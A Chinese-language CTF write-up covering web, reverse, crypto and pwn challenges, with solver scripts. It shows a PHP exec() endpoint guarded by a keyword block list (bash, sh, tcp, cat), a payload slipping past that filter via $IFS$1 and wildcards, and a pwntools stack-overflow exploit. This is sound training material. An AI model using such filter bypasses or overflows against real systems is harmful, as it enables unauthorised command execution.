## 写在前面

19号凌晨，打了两个小时就没打了，白天又去打TQLCTF了，导致把这个比赛忘记了，后面题目上新也没看见，排名60+，这几天补一下吧

——KonDream 2022年2月21日15:12:35

## MISC

### Sign-in

红客突击队公众号发送“HSC2019”

## WEB

### CLICK

前端验证，翻翻源码就出了

### Web-sign in

访问robots.txt得到fiag_ls_h3re.php，发现右键被禁，F12被禁，直接开发者工具看源码出flag

### EXEC

这题是三血，不难

```php
<?php
error_reporting(0);
if(isset($_REQUEST["cmd"])){
    $shell = $_REQUEST["cmd"];
    $shell = str_ireplace(" ","",$shell);
    $shell = str_ireplace("\n","",$shell);
    $shell = str_ireplace("\t","",$shell);
    $shell = str_ireplace("?","",$shell);
    $shell = str_ireplace("*","",$shell);
    $shell = str_ireplace("<","",$shell);
    $shell = str_ireplace("system","",$shell);
    $shell = str_ireplace("passthru","",$shell);
    $shell = str_ireplace("ob_start","",$shell);
    $shell = str_ireplace("getenv","",$shell);
    $shell = str_ireplace("putenv","",$shell);
    $shell = str_ireplace("mail","",$shell);
    $shell = str_ireplace("error_log","",$shell);
    $shell = str_ireplace("`","",$shell);
    $shell = str_ireplace("exec","",$shell);
    $shell = str_ireplace("shell_exec","",$shell);
    $shell = str_ireplace("echo","",$shell);
    $shell = str_ireplace("cat","",$shell);
    $shell = str_ireplace("ls","",$shell);
    $shell = str_ireplace("nl","",$shell);
    $shell = str_ireplace("tac","",$shell);
    $shell = str_ireplace("bash","",$shell);
    $shell = str_ireplace("sh","",$shell);
    $shell = str_ireplace("tcp","",$shell);
    $shell = str_ireplace("base64","",$shell);
    $shell = str_ireplace("flag","",$shell);
    $shell = str_ireplace("cp","",$shell);
    exec($shell);
}else{
    highlight_file(__FILE__);
}
```

一堆过滤，exec执行结果看不到，考虑ls>1.txt，将结果重定向到一个文件里就行了，空格用$IFS$1绕，ls用dir绕，flag在根目录的ctf_is_fun_flag2021，但是flag被过滤，用通配符绕，最终payload：``/?cmd=more$IFS$1/ctf_is_fun_fla[f-h]2021>3.txt``

## REVERSE

### hiahia o(*^▽^*)┛

挺简单的，直接逆就行

```python
'''
Author: KonDream
Date: 2022-02-19 00:53:43
LastEditors:  KonDream
LastEditTime: 2022-02-19 00:58:03
Description:  
'''
a = 'igdb~Mumu@p&>%;%<$<p'
flag = ''
for i in range(20):
    if i > 9:
        if i & 1 == 0:
            flag += chr(ord(a[i])-11)
        if i % 2 == 1:
            flag += chr(ord(a[i])+13)
    else:
        if i & 1 == 0:
            flag += chr(ord(a[i])-3)
        if i % 2 == 1:
            flag += chr(ord(a[i])+5)

print(flag)
# flag{RrrrEe33202111}
```

### Android

源码

```java
public void onClick(View arg8) {
    String v8 = this.input.getText().toString().trim();
    int v0 = 18;
    int[] v1 = new int[]{102, 13, 99, 28, 0x7F, 55, 99, 19, 109, 1, 0x79, 58, 83, 30, 0x4F, 0, 0x40, 42};
    int[] v2 = new int[]{42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42};
    if(v8.length() != v0) {
        this.input.setText("FLAG错误");
    }
    else {
        char[] v8_1 = v8.toCharArray();
        int v3 = 0;
        int v4;
        for(v4 = 0; v4 < 17; ++v4) {
            int v5 = v4 % 2 == 0 ? v8_1[v4] ^ v4 : v8_1[v4] ^ v8_1[v4 + 1];
            v2[v4] = v5;
        }

        v8 = "";
        for(v4 = 0; v4 < v0; ++v4) {
            v8 = v8.concat(Integer.toHexString(v2[v4])).concat(",");
        }

        System.out.println(v8);
        while(v3 < v0) {
            if(v2[v3] != v1[v3]) {
                this.input.setText("FLAG错误！");
                return;
            }

            ++v3;
        }

        this.input.setText("FLAG正确");
    }
}
```

直接逆

```python
'''
Author: KonDream
Date: 2022-02-19 01:20:11
LastEditors:  KonDream
LastEditTime: 2022-02-19 01:36:54
Description:  
'''
a = [102, 13, 99, 28, 0x7F, 55, 99, 19, 109, 1, 0x79, 58, 83, 30, 0x4F, 0, 0x40, 42];

flag1 = ''
for i in range(18):
    if i % 2 == 0:
        flag1 += chr(a[i] ^ i)
    else:
        flag1 += ' '

flag2 = ''
for i in range(17):
    if i % 2 == 1:
        flag2 += chr(a[i] ^ ord(flag1[i+1]))
    else:
        flag2 += ' '

flag = ''
for i in range(17):
    if i % 2 == 0:
        flag += flag1[i]
    else:
        flag += flag2[i]

print(flag + '}')
# flag{Reverse__APP}
```

## Crypto

### Easy SignIn

```markdown
5445705857464579517A4A48546A4A455231645457464243566B5579556C7053546C4A4E524564565646644D515670455130354C5755644F5231685256314A5452315A5552304E57576C5A49525430395054303950513D3D
```

应该都是base，ciphey一把梭

## PWN

### Ez_pwn

属于是签到题了，我这个小白都能做，栈溢出，返回到后门地址即可

```python
'''
Author: KonDream
Date: 2022-02-19 01:47:08
LastEditors:  KonDream
LastEditTime: 2022-02-21 15:37:08
Description:  
'''
from pwn import *
import pwn
# p = remote("hsc2019.site",10485)
p = pwn.process("pwn")
# 地址忘了，自行填吧
payload = b"A"*(0x64+8) + p64(xxx)
print(payload)
p.sendline(payload)

p.interactive()
```

